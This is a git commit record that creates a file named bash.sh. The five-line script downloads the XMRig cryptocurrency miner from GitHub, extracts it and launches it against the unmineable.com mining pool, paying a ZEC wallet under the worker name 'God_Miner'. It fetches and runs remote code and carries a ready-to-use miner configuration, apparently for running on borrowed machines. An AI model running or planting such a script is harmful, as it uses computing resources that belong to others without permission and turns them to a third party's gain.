aaa52f7ba81e597a746abf71ec8264d33503e995
varunkanjolia04 <92790490+varunkanjolia04@users.noreply.github.com>
2021-10-21 10:59:50 +0530

    Create bash.sh

---
+++ bash.sh
@@ -0,0 +1,5 @@
+wget https://github.com/xmrig/xmrig/releases/download/v6.15.0/xmrig-6.15.0-linux-static-x64.tar.gz
+tar -xvf xmrig-6.15.0-linux-static-x64.tar.gz
+ls
+cd xmrig-6.15.0
+./xmrig -o rx.unmineable.com:3333 -a rx -k -u ZEC:t1ZVRrZwdzmkmbjdqrGXiizHjHM59J69p7B.God_Miner#ek61-6h9x -p x --cpu 4
